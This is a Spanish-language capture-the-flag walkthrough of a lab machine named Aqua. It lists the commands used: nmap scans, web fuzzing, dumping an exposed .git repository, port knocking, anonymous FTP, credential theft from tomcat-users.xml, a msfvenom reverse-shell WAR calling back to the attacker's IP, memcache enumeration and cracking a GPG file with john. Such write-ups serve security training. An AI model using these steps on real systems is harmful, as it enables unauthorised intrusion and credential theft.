# Máquina Aqua
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.32

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,8009,8080 -vvv -Pn 10.0.2.32

![alt text](image-2.png)

### Fuzzing Web

feroxbuster --url http://10.0.2.32/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

### Explotación

Entré en la web por el puerto 80

![alt text](image-4.png)

luego revisé el robots.txt 

![alt text](image-5.png)

Hice fuzzing web a /SuperCMS/

feroxbuster --url http://10.0.2.32/SuperCMS/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

![alt text](image-6.png)

Entré a /SuperCMS/ hice ctrl + u y encontré un hash en base64

![alt text](image-7.png)

decodificando: 1=2 = password_zip

observando al entrar en http://10.0.2.32/ y haciendo ctrl + u observé

![alt text](image-8.png)

por ende password_zip = agua=H2O

traje el .git a mi kali con git-dumper

git-dumper http://10.0.2.32/SuperCMS/.git/ dump

observo todos los commit con git log --all y me llama la atención este commit:

![alt text](image-9.png)

lo reviso con más detalle

![alt text](image-10.png)

se trata de port-knocking por ende realizo la técnica para descubrir los puertos ocultos:

![alt text](image-11.png)

vuelvo hacer un escaneo de puertos y descubrí el puerto 21

![alt text](image-12.png)

![alt text](image-13.png)

entro con el usuario anonymous y hay un directorio llamado pub y dentro del mismo un archivo oculto llamado .backup.zip

![alt text](image-14.png)

lo descomprimí con 7z x .backup.zip y me aparece un archivo tomcat-users.xml y al visualizarlo encuentro las siguientes credenciales:

![alt text](image-15.png)

luego al entrar a http://10.0.2.32:8080/ encuentro un tomcat e inicio sesión con las credenciales encontradas.

creo un rev.war con msfvenom 

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f war -o rev.war

lo subo y luego me coloco en escucha con nc en el puerto 4444

![alt text](image-16.png)

al hacer ps aux

![alt text](image-17.png)

me conecté a memcache

telnet localhost 11211

luego ejecuté el comando stats

![alt text](image-19.png)

![alt text](image-20.png)

![alt text](image-21.png)

### Escalar privilegios

me conecto por ssh con las credenciales encontradas:

![alt text](image-18.png)

![alt text](image-22.png)

### user.txt

![alt text](image-23.png)

### root.txt

existe el archivo root.txt.gpg lo descargue a mi kali y lo crackié con john

![alt text](image-26.png)

![alt text](image-24.png)

![alt text](image-25.png)

![alt text](image-27.png)

